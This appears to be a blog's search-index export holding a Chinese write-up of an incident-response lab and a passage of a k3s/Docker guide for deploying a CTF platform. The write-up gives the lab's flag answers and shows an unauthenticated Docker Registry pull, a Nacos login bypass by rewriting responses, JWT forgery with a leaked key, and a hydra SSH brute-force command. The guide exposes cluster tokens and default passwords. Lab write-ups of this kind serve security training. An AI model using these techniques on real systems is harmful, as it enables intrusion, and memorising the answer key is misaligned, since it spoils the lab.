<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>玄机应急响应-第九章-blueteam 的小心思2</title>
    <url>/posts/b8335347/</url>
    <content><![CDATA[<p>做了半天多 水平有限 修复类的 不会修复  可只看前5个带flag的WP</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>ssh 端口 2222</p>
<ol>
<li>nacos 的 key 为多少 flag{base64decodekey}   flag{xjnacos2023penguinedisecflagflagflag}</li>
<li>nacos配置文件的 flag  flag{9d7ffcef-bcd1-4f4b-9a2d-d51862484168}</li>
<li>File Management System的 flag    flag{d6c578d4a41a141d731fe7c36c8c0f77}</li>
<li>root 密码多少 flag{password}  flag{imArGcj9}</li>
<li>黑客留下的 backdoor 后门的绝对路径  flag{/etc/systemd/system/evilfms.service}</li>
<li>修复 4000-6000 端口漏洞</li>
<li>修复File Management System漏洞</li>
<li>清理黑客留下的backdoor</li>
</ol>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>这个题需要先渗透 后应急</p>
<p>扫描器扫下IP 发现存在3个WEB服务  5000(未知)、8082(FMS)、8848(Nacos)</p>
<p><img src="/posts/b8335347/image-20240607150424444.png" alt="image-20240607150424444"></p>
<p><img src="/posts/b8335347/image-20240607150412632.png" alt="image-20240607150412632"></p>
<h4 id="1-nacos-的-key-为多少-flag-base64decodekey"><a href="#1-nacos-的-key-为多少-flag-base64decodekey" class="headerlink" title="1. nacos 的 key 为多少 flag{base64decodekey}."></a>1. nacos 的 key 为多少 flag{base64decodekey}.</h4><p><a href="http://43.192.63.251:5000/">http://43.192.63.251:5000/</a> 访问为空白页面  dirsearch扫下目录</p>
<p><img src="/posts/b8335347/image-20240607150459841.png" alt="image-20240607150459841"></p>
<p><img src="/posts/b8335347/image-20240607150553591.png" alt="image-20240607150553591"> </p>
<p>根据特征网上发现为Docker Registry API未授权访问漏洞.</p>
<blockquote>
<p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为 1.3 和 1.6因为权限控制等问题导致可以通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>
</blockquote>
<p>获取指定仓库中镜像的tag列表</p>
<p><img src="/posts/b8335347/image-20240607150614083.png" alt="image-20240607150614083"></p>
<p>利用工具下载容器  <a href="https://github.com/NotSoSecure/docker_fetch/">https://github.com/NotSoSecure/docker_fetch/</a></p>
<p>python docker_image_fetch.py -u  <a href="http://43.192.63.251:5000/">http://43.192.63.251:5000</a> </p>
<p><img src="/posts/b8335347/image-20240607150632918.png" alt="image-20240607150632918"></p>
<p>下载后 将 .tar.gz 文件 解压可看到目录结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for i in *.tar.gz; do tar -xzvf $i; done</span><br></pre></td></tr></table></figure>

<p>解压后如下</p>
<p><img src="/posts/b8335347/image-20240607150645891.png" alt="image-20240607150645891"></p>
<p>翻文件 查找nacos敏感文件  find . -name conf </p>
<p><img src="/posts/b8335347/image-20240607150720121.png" alt="image-20240607150720121"></p>
<p>在home目录下发现 nacos 在  applicantion.properties中找到key </p>
<p><img src="/posts/b8335347/image-20240607150802463.png" alt="image-20240607150802463"></p>
<p><img src="/posts/b8335347/image-20240607150848515.png" alt="image-20240607150848515"></p>
<p>解密得到 flag{xjnacos2023penguinedisecflagflagflag}</p>
<h4 id="2-nacos配置文件的-flag"><a href="#2-nacos配置文件的-flag" class="headerlink" title="2. nacos配置文件的 flag"></a>2. nacos配置文件的 flag</h4><p>在nacos的 conf目录下 发现数据库密码 奈何无法解密 无法利用</p>
<p><img src="/posts/b8335347/image-20240607150958932.png" alt="image-20240607150958932"></p>
<p>去拉下私有仓库</p>
<p><img src="/posts/b8335347/image-20240607151020319.png" alt="image-20240607151020319"></p>
<p>试了好几种方法 最终解决方案参考 <a href="https://www.cnblogs.com/programmer-tlh/p/10996443.html">https://www.cnblogs.com/programmer-tlh/p/10996443.html</a></p>
<p><img src="/posts/b8335347/image-20240607151037999.png" alt="image-20240607151037999"></p>
<p>启动docker 进入容器</p>
<p><img src="/posts/b8335347/image-20240607151059502.png" alt="image-20240607151059502"></p>
<p><del>好像没啥用</del>  接着在网上找nacos相关漏洞，在github发现了这个  nacos Default token</p>
<p><img src="/posts/b8335347/image-20240607151139077.png" alt="image-20240607151139077"></p>
<p>那么 如果在本地部署一个nacos 然后将配置文件改为和 容器相同的环境 ， 通过默认账号登录获取到 accesstoken。</p>
<p>可不可以用这个 AccessToken去登录到靶机的后台中呢？？？</p>
<p>翻到这篇文章 <a href="https://blog.csdn.net/y995zq/article/details/137668381">https://blog.csdn.net/y995zq/article/details/137668381</a>  文章提到可以去修改登录后的响应包 </p>
<p>于是想在本地docker中试一下能不能按文章的思路去获取AccessToken 然后在靶机上利用【因为都是利用的同一个靶机，他们的nacos配置文件(key)都是同一个。】</p>
<p>在本地docker登录 但是由于不知道账号密码 无法直接登录。</p>
<p>然后在docker中的nacos中进行配置关闭鉴权</p>
<p><img src="/posts/b8335347/image-20240607151458400.png" alt="image-20240607151458400"></p>
<p>关闭后发现没有任何有效数据可以利用，然后又在 applicantion. 中恢复了鉴权。恢复鉴权后nacos的密码将会被重置为nacos，因此成功登录到了nacos的后台。</p>
<p><img src="/posts/b8335347/image-20240607151704577.png" alt="image-20240607151704577"></p>
<p>F12 拿到 accessToken</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcxNzc0MTkyNn0.3j_90EB5peq10xsqMYSwapYDEKa3iCujD7o19hmTaek&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true,&quot;username&quot;:&quot;nacos&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/b8335347/image-20240607151727920.png" alt="image-20240607151727920"></p>
<p>在nacos中进行登录时，如果账号密码不正确 将会返回403</p>
<p><img src="/posts/b8335347/image-20240607151833009.png" alt="image-20240607151833009"></p>
<p>回到互联网上的靶机nacos ,参考<a href="https://blog.csdn.net/y995zq/article/details/137668381">https://blog.csdn.net/y995zq/article/details/137668381</a> 的拦截返回包，我们拦截后进行修改，</p>
<p><img src="/posts/b8335347/image-20240607152144161.png" alt="image-20240607152144161"></p>
<p>将403改成200 然后将 返回内容设置为 acessToken </p>
<p><img src="/posts/b8335347/image-20240607152011644.png" alt="image-20240607152011644"></p>
<p><img src="/posts/b8335347/image-20240607152029700.png" alt="image-20240607152029700"></p>
<p>然后放包 成功登录到nacos的后台</p>
<p><img src="/posts/b8335347/image-20240607152107469.png" alt="image-20240607152107469"></p>
<p>在ADMIN_CONFIG中找到flag 及 file-managerpassword</p>
<p><img src="/posts/b8335347/image-20240607152223432.png" alt="image-20240607152223432"></p>
<p>flag{9d7ffcef-bcd1-4f4b-9a2d-d51862484168}</p>
<p>file-managerpassword</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file-manager:</span><br><span class="line">  name: admin</span><br><span class="line">  password: xj2023@1578921@123</span><br><span class="line">  jwtkey: 123456</span><br><span class="line">#flag&#123;9d7ffcef-bcd1-4f4b-9a2d-d51862484168&#125;</span><br></pre></td></tr></table></figure>

<p>还有 mysql 配置【但是在docker里面好像没有mysql…，后续登录到ssh中也未发现存在mysql】</p>
<p><img src="/posts/b8335347/image-20240607152343544.png" alt="image-20240607152343544"></p>
<h4 id="3-File-Management-System的-flag"><a href="#3-File-Management-System的-flag" class="headerlink" title="3.File Management System的 flag"></a>3.File Management System的 flag</h4><p>在Nacos中翻到FMS的账号密码 访问8082端口</p>
<p><img src="/posts/b8335347/image-20240607152431126.png" alt="image-20240607152431126"></p>
<p>提示权限不够 要求用sysadmin123456进行登录</p>
<p>抓包看到是jwt认证，将name从admin改成sysadmin123456 在签名中使用jwtkey 123456</p>
<p><img src="/posts/b8335347/image-20240607152517662.png" alt="image-20240607152517662"></p>
<p>生成  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJob3N0IiwibmFtZSI6InN5c2FkbWluMTIzNDU2IiwiZXhwIjoxNzE3NzMyNDU3LCJpYXQiOjE3MTc3MjUyNTd9.cUzyE8BizVxrRwVk1J_YFIUr2ED272TTGb_6ki0vvOc</p>
<p>去替换burp请求包中的token去创建目录，发现创建成功，说明方法可行，执行时成功为sysadmin123456用户。</p>
<p><img src="/posts/b8335347/image-20240607152609216.png" alt="image-20240607152609216"></p>
<p>然后重新把请求包的 token改成修改后的 jwt 刷新成功为高权限的 sysadmin123456，看到里面包含一个运维账号、图片及一个txt</p>
<p><img src="/posts/b8335347/image-20240607152625661.png" alt="image-20240607152625661"></p>
<p>下载运维账号表  保护大量IP及 root密码  但是不知道那个密码是有效的 去爆破下ssh 2222</p>
<p><img src="/posts/b8335347/image-20240607152651482.png" alt="image-20240607152651482"></p>
<p>翻完了三个文件 但是还没有找到flag …</p>
<p>传个文件试试. 在hae插件里面 设置了个 flag关键字 翻下History </p>
<p>在上传成功后 找到flag </p>
<p><img src="/posts/b8335347/image-20240607152811728.png" alt="image-20240607152811728"></p>
<p>  flag{d6c578d4a41a141d731fe7c36c8c0f77}</p>
<h4 id="4-root-密码多少-flag-password"><a href="#4-root-密码多少-flag-password" class="headerlink" title="4.root 密码多少 flag{password}"></a>4.root 密码多少 flag{password}</h4><p>FMS 里面给了 root 密码 但是 有很多ip的 </p>
<p>把密码提取出来作为字典去爆破</p>
<p>本来用超级弱口令工具的 把ssh端口改成2222 但是扫描还是扫不出来 恼!</p>
<p>换hydra试试</p>
<p>└─$ hydra -l root -P 2222.txt   -t 4  ssh://52.83.41.206 -s 2222</p>
<p><img src="/posts/b8335347/image-20240607152851297.png" alt="image-20240607152851297"></p>
<p>找到root 密码 imArGcj9</p>
<p>flag{imArGcj9}</p>
<h4 id="5-黑客留下的-backdoor-后门的绝对路径"><a href="#5-黑客留下的-backdoor-后门的绝对路径" class="headerlink" title="5.黑客留下的 backdoor 后门的绝对路径"></a>5.黑客留下的 backdoor 后门的绝对路径</h4><p>登录ssh  注意ssh端口是2222！  密码为 imArGcj9</p>
<p><img src="/posts/b8335347/image-20240607152939260.png" alt="image-20240607152939260"></p>
<p>查看账号和相关文件备份，没发现啥有用信息。找了下计划任务 启动项 没找到东西【在/etc/shadow 和 shadow/.bak中 看到一个_apt账号感觉有点可疑】 </p>
<p><img src="/posts/b8335347/image-20240607153007705.png" alt="image-20240607153007705"></p>
<p><img src="/posts/b8335347/image-20240607153059757.png" alt="image-20240607153059757"></p>
<p>找下 nacos\ fms相关，发现一个 evilfms.service </p>
<p>其路径为 ./etc/systemd/system/multi-user.target.wants/evilfms.service【但是此题的问题描述有问题，应该是让提交恶意后面的绝对路径 尝试了好几次 最终确定 flag{/etc/systemd/system/svilfms.service}</p>
<p><img src="/posts/b8335347/image-20240607153115444.png" alt="image-20240607153115444"></p>
<p>flag{/etc/systemd/system/svilfms.service}</p>
<h4 id="6-修复-4000-6000-端口漏洞"><a href="#6-修复-4000-6000-端口漏洞" class="headerlink" title="6.修复 4000-6000 端口漏洞"></a>6.修复 4000-6000 端口漏洞</h4><p>5000端口 存在  Docker Register API未授权</p>
<p>在防火墙上 配置 禁止外网访问 5000 端口</p>
<p><code>iptables -F</code> 清除原来的【不然不起作用】</p>
<p><code>sudo iptables -A INPUT -p tcp --dport 5000 -j DROP</code></p>
<h4 id="7-修复File-Management-System漏洞"><a href="#7-修复File-Management-System漏洞" class="headerlink" title="7.修复File Management System漏洞"></a>7.修复File Management System漏洞</h4><p>FMS中存在 JWT绕过，找到对应服务使用的jar包在 home目录下  名为 fms.jar </p>
<p>jadx-gui 打开 fms.jar</p>
<p>检索关键词 sysadmin</p>
<p><img src="/posts/b8335347/image-20240607154232266.png" alt="image-20240607154232266"></p>
<p><img src="/posts/b8335347/image-20240607160249508.png" alt="image-20240607160249508"></p>
<p>jwt这块 需要加校验</p>
<p>【不会修】o.0</p>
<h4 id="8-清理黑客留下的backdoor"><a href="#8-清理黑客留下的backdoor" class="headerlink" title="8.清理黑客留下的backdoor"></a>8.清理黑客留下的backdoor</h4><p>后门被清了？？？ o.0 还是没设置后门呢</p>
<p>cat /etc/systemed/system/evilfms.service </p>
<p><img src="/posts/b8335347/image-20240607153442790.png" alt="image-20240607153442790"></p>
<p>公网访问 这个url http://<IP>:8082/assets/images/fti/txt.png</IP></p>
<p>下载下来 010editor看了下 就是个png 并不是elf文件</p>
<p>在靶机上运行 也自然不是那个 ”后门“</p>
<p><img src="/posts/b8335347/image-20240607155014549.png" alt="image-20240607155014549"></p>
<p><img src="/posts/b8335347/image-20240607155305869.png" alt="image-20240607155305869"></p>
<p>在jadx中找到该路径下 也是正常文件 o.0?!! 【不知是没有后门 还是没找到 弄了很久先不弄这个了】</p>
<p><img src="/posts/b8335347/image-20240607155722861.png" alt="image-20240607155722861"></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://www.cnblogs.com/programmer-tlh/p/10996443.html">https://www.cnblogs.com/programmer-tlh/p/10996443.html</a></p>
<p><a href="https://blog.csdn.net/y995zq/article/details/137668381">https://blog.csdn.net/y995zq/article/details/137668381</a></p>
<p><a href="https://www.cnblogs.com/f-carey/p/18055849#tid-nzXisP">https://www.cnblogs.com/f-carey/p/18055849#tid-nzXisP</a></p>
]]></content>
  </entry>
  <entry>
    <title>k3s_docker分离部署gzctf</title>
    <url>/posts/c2d41507/</url>
    <content><![CDATA[<p>k3s+docker 部署gzctf过程记录</p>
<h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><h3 id="服务器x3"><a href="#服务器x3" class="headerlink" title="服务器x3"></a>服务器x3</h3><p>k3s-master        192.168.80.20</p>
<p>k3s-slave        192.168.80.27(26)</p>
<p>gzctfweb         192.168.80.28(63)</p>
<p>别用dhcp 弄个靠后的ip桥接</p>
<h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname gzctfweb  # gzctfweb服务器执行</span><br><span class="line">hostnamectl set-hostname k3s-master</span><br><span class="line">hostnamectl set-hostname k3s-slave</span><br></pre></td></tr></table></figure>



<h3 id="关闭防火墙-三台机器都执行"><a href="#关闭防火墙-三台机器都执行" class="headerlink" title="关闭防火墙  三台机器都执行"></a>关闭防火墙  三台机器都执行</h3><p>ubuntu  关闭防火墙</p>
<p>sudo ufw disable </p>
<p>清空iptables规则</p>
<p>iptables -F</p>
<h3 id="配置hosts解析"><a href="#配置hosts解析" class="headerlink" title="配置hosts解析"></a>配置hosts解析</h3><p>在k3s master和 slave中执行</p>
<p>cat &gt;&gt;/etc/hosts&lt;&lt;EOF 192.168.80.20 k3s-master 192.168.80.27 k3s-slave  EOF</p>
<h3 id="安装docker【k3s-master-slave执行】"><a href="#安装docker【k3s-master-slave执行】" class="headerlink" title="安装docker【k3s master\slave执行】"></a>安装docker【k3s master\slave执行】</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://releases.rancher.com/install-docker/20.10.sh | sh</span><br><span class="line">systemctl enable --now docker  # docker开启自启</span><br></pre></td></tr></table></figure>



<h2 id="k3s-部署-gzctf"><a href="#k3s-部署-gzctf" class="headerlink" title="k3s 部署 gzctf"></a>k3s 部署 gzctf</h2><h3 id="1-安装k3s集群"><a href="#1-安装k3s集群" class="headerlink" title="1.安装k3s集群"></a>1.安装k3s集群</h3><p>按gzctf中 下载k3s  </p>
<p>curl -sfL <a href="https://rancher-mirror.rancher.cn/k3s/k3s-install.sh">https://rancher-mirror.rancher.cn/k3s/k3s-install.sh</a> | INSTALL_K3S_MIRROR=cn sh -</p>
<p>但不加配置参数 加别的额外参数会报错</p>
<h3 id="2-安装slave节点"><a href="#2-安装slave节点" class="headerlink" title="2.安装slave节点"></a>2.安装slave节点</h3><p>在k3s-master中查看 token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/lib/rancher/k3s/server/node-token </span><br><span class="line">K1049517f32c21a31aac5b53e5423386b6b0ae9b0e706b06cc1baebfe3e474929a3::server:ab280ce6ccffbd6d5c97a9036f973072</span><br></pre></td></tr></table></figure>

<p>将toekn和 master对应ip填入 配置slave端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_EXEC=&quot;--docker&quot; K3S_URL=https://192.168.80.20:6443 K3S_TOKEN=K1049517f32c21a31aac5b53e5423386b6b0ae9b0e706b06cc1baebfe3e474929a3::server:ab280ce6ccffbd6d5c97a9036f973072 sh -  </span><br><span class="line"></span><br><span class="line"># 开机自启</span><br><span class="line">systemctl enable --now k3s-agent.service</span><br></pre></td></tr></table></figure>



<h3 id="3-更改nodeport-端口范围【master执行】"><a href="#3-更改nodeport-端口范围【master执行】" class="headerlink" title="3.更改nodeport 端口范围【master执行】"></a>3.更改nodeport 端口范围【master执行】</h3><p>vim /etc/systemd/system/k3s.service</p>
<p>在ExecStart = /usr/local/bin/k3s 最后写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--kube-apiserver-arg service-node-port-range=20000-50000</span><br></pre></td></tr></table></figure>



<h3 id="4-更改k3s容器数量限制【master-slave执行】"><a href="#4-更改k3s容器数量限制【master-slave执行】" class="headerlink" title="4.更改k3s容器数量限制【master/slave执行】"></a>4.更改k3s容器数量限制【master/slave执行】</h3><p>vim /etc/rancher/k3s/kubelet.config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: kubelet.config.k8s.io/v1beta1</span><br><span class="line">kind: KubeletConfiguration</span><br><span class="line">maxPods: 500  # 容器数量限制</span><br></pre></td></tr></table></figure>

<p>vim /etc/systemd/system/k3s.service</p>
<p>在ExecStart=/usr/local/bin/k3s最后写入如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--kubelet-arg=config=/etc/rancher/k3s/kubelet.config</span><br></pre></td></tr></table></figure>



<h3 id="5-添加docker镜像仓库【master执行】"><a href="#5-添加docker镜像仓库【master执行】" class="headerlink" title="5.添加docker镜像仓库【master执行】"></a>5.添加docker镜像仓库【master执行】</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mirrors:</span><br><span class="line">  &quot;docker.io&quot;:</span><br><span class="line">    endpoint:</span><br><span class="line">      - &quot;https://hub.docker.com&quot;</span><br></pre></td></tr></table></figure>



<h3 id="6-配置完成后-重启k3s集群"><a href="#6-配置完成后-重启k3s集群" class="headerlink" title="6.配置完成后 重启k3s集群"></a>6.配置完成后 重启k3s集群</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart k3s  # master节点</span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart k3s-agent # slave节点</span><br></pre></td></tr></table></figure>



<h3 id="7-gzctfweb配置"><a href="#7-gzctfweb配置" class="headerlink" title="7.gzctfweb配置"></a>7.gzctfweb配置</h3><ol>
<li>docker-compose.yml</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3.0&#x27;</span><br><span class="line">services:</span><br><span class="line">  gzctf:</span><br><span class="line">    image: gztime/gzctf:latest</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - &quot;GZCTF_ADMIN_PASSWORD=Admin123&quot;  # gzctf管理员初始密码</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;80:8080&quot;</span><br><span class="line">    networks:</span><br><span class="line">      default:</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;./data/files:/app/files&quot;</span><br><span class="line">      - &quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br><span class="line">      - &quot;./logs:/app/log&quot;</span><br><span class="line">      # - &quot;./data/keys:/root/.aspnet/DataProtection-Keys&quot;</span><br><span class="line">      - &quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span><br><span class="line">      # - &quot;/var/run/docker.sock:/var/run/docker.sock&quot;</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line"> </span><br><span class="line">  db:</span><br><span class="line">    image: postgres:alpine</span><br><span class="line">    restart: always</span><br><span class="line">    environment:</span><br><span class="line">      - &quot;POSTGRES_PASSWORD=admin123&quot;  # 数据库的密码</span><br><span class="line">    networks:</span><br><span class="line">      default:</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;./data/db:/var/lib/postgresql/data&quot;</span><br><span class="line"> </span><br><span class="line">networks:</span><br><span class="line">  default:</span><br><span class="line">    driver: bridge</span><br><span class="line">    ipam:</span><br><span class="line">      config:</span><br><span class="line">        - subnet: 192.168.12.0/24</span><br></pre></td></tr></table></figure>



<ol>
<li>appsettings.json</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;AllowedHosts&quot;: &quot;*&quot;,</span><br><span class="line">  &quot;ConnectionStrings&quot;: &#123;</span><br><span class="line">    &quot;Database&quot;: &quot;Host=db:5432;Database=gzctf;Username=postgres;Password=admin123&quot;  //数据库的信息</span><br><span class="line">    // redis is optional</span><br><span class="line">    //&quot;RedisCache&quot;: &quot;cache:6379,password=&lt;Redis Password&gt;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;Logging&quot;: &#123;</span><br><span class="line">    &quot;LogLevel&quot;: &#123;</span><br><span class="line">      &quot;Default&quot;: &quot;Information&quot;,</span><br><span class="line">      &quot;Microsoft&quot;: &quot;Warning&quot;,</span><br><span class="line">      &quot;Microsoft.Hosting.Lifetime&quot;: &quot;Information&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;EmailConfig&quot;: &#123;</span><br><span class="line">    &quot;SendMailAddress&quot;: &quot;a@a.com&quot;,</span><br><span class="line">    &quot;UserName&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Password&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Smtp&quot;: &#123;</span><br><span class="line">      &quot;Host&quot;: &quot;localhost&quot;,</span><br><span class="line">      &quot;Port&quot;: 587</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;XorKey&quot;: &quot;z&quot;,  //异或加密密钥</span><br><span class="line">  &quot;ContainerProvider&quot;: &#123;</span><br><span class="line">    &quot;Type&quot;: &quot;Kubernetes&quot;, // or &quot;Kubernetes&quot;</span><br><span class="line">    &quot;PublicEntry&quot;: &quot;192.168.80.20&quot;, // 写k3s-master的ip</span><br><span class="line">    &quot;DockerConfig&quot;: &#123;</span><br><span class="line">      // optional</span><br><span class="line">      &quot;SwarmMode&quot;: false,</span><br><span class="line">      &quot;Uri&quot;: &quot;unix:///var/run/docker.sock&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;RequestLogging&quot;: false,</span><br><span class="line">  &quot;DisableRateLimit&quot;: false,</span><br><span class="line">  &quot;RegistryConfig&quot;: &#123;</span><br><span class="line">    &quot;UserName&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Password&quot;: &quot;&quot;,</span><br><span class="line">    &quot;ServerAddress&quot;: &quot;&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;GoogleRecaptcha&quot;: &#123;</span><br><span class="line">    &quot;VerifyAPIAddress&quot;: &quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;,</span><br><span class="line">    &quot;Sitekey&quot;: &quot;&quot;,</span><br><span class="line">    &quot;Secretkey&quot;: &quot;&quot;,</span><br><span class="line">    &quot;RecaptchaThreshold&quot;: &quot;0.5&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ol>
<li>kube-config.yaml</li>
</ol>
<p>在master机器中 cat /etc/rancher/k3s/k3s.yaml 在web机器中另存为 kube-config.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTVRZNE9ESTBNamN3SGhjTk1qUXdOVEk0TURjME56QTNXaGNOTXpRd05USTJNRGMwTnpBMwpXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTVRZNE9ESTBNamN3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFRNm9sRE53c3RUN2k5S1A3VXUyZzdmNlRnZ3AycnVHMWxubWJMWFRNeSsKb3hHZmVBUDRGam0rYzBJd0JMY1JyRnVXcVZlZ1g2T0x4dzRvRkMzS3NRM2tvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXMvSUZtaGRNeGsrNGc2TkFXMnU3CjJGU1M3eXN3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUlnR1lqYkFUYnBrWGQydEZ6c3FUamdFc0VWdmx6UWNsK1EKdzV6SWIvWC9ZZkVDSVFDc3dtek1rSVhYbEJ2dm51OTQxNS9rNFdoY2p2aEhyWThCRTRzQkZtMWZjZz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K</span><br><span class="line">    server: https://192.168.80.20:6443  //写k3s-master的ip:porthttps://127.0.0.1:6443</span><br><span class="line">  name: default</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: default</span><br><span class="line">    user: default</span><br><span class="line">  name: default</span><br><span class="line">current-context: default</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: default</span><br><span class="line">  user:</span><br><span class="line">    client-certificate-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJrVENDQVRlZ0F3SUJBZ0lJYS8xZEwxMXNkUkV3Q2dZSUtvWkl6ajBFQXdJd0l6RWhNQjhHQTFVRUF3d1kKYXpOekxXTnNhV1Z1ZEMxallVQXhOekUyT0RneU5ESTNNQjRYRFRJME1EVXlPREEzTkRjd04xb1hEVEkxTURVeQpPREEzTkRjd04xb3dNREVYTUJVR0ExVUVDaE1PYzNsemRHVnRPbTFoYzNSbGNuTXhGVEFUQmdOVkJBTVRESE41CmMzUmxiVHBoWkcxcGJqQlpNQk1HQnlxR1NNNDlBZ0VHQ0NxR1NNNDlBd0VIQTBJQUJISFlIbDMvL0EybnZ3alAKNDUxeHU0REhDbUtacTY4aXRqUHhJSkdaaE5MWU1yY1pXWnZjZWFZN1FXeERvZi9KcVJUekdGY3RPUXV3V1NNOQpvd1NJd1IralNEQkdNQTRHQTFVZER3RUIvd1FFQXdJRm9EQVRCZ05WSFNVRUREQUtCZ2dyQmdFRkJRY0RBakFmCkJnTlZIU01FR0RBV2dCUll1YmlPTUZNZHhFb0Z2bVRDeGFIaHdhODBkVEFLQmdncWhrak9QUVFEQWdOSUFEQkYKQWlBOU5tL0lPdTBqQ25aNGtjaWJqTEdCSUgyRFllMmdLNklWb3ppQXdrZXQxZ0loQU5qdlJSUzEvYitRU1c3eAp3TktBYUQrTkdTbXhmd1dHZWJ5aGtmZVJvMGhuCi0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0KLS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJlRENDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdFkyeHAKWlc1MExXTmhRREUzTVRZNE9ESTBNamN3SGhjTk1qUXdOVEk0TURjME56QTNXaGNOTXpRd05USTJNRGMwTnpBMwpXakFqTVNFd0h3WURWUVFEREJock0zTXRZMnhwWlc1MExXTmhRREUzTVRZNE9ESTBNamN3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFSa29zNWYyU2pWNWhHWHhTMERoMlZUR01FMktYV3gzb0NWSWhzY3JCYXQKdlRaZjJmSi9oRHZNeTlOTmdpMHlTMW9CWnBvNVQwTkJLY25YZ0lnNlN1ZnFvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVVdMbTRqakJUSGNSS0JiNWt3c1doCjRjR3ZOSFV3Q2dZSUtvWkl6ajBFQXdJRFNRQXdSZ0loQUlXbHcraUNkL25uZjRJaittekFlSHZNbDc0Q2o4V0kKRnBYM3djcjcyTytxQWlFQXZiT2dRT0RVNExFdWdxRCtGSHRYdWVtTHBSeHdDK2thTjJNN3JyVEJzRzA9Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K</span><br><span class="line">    client-key-data: 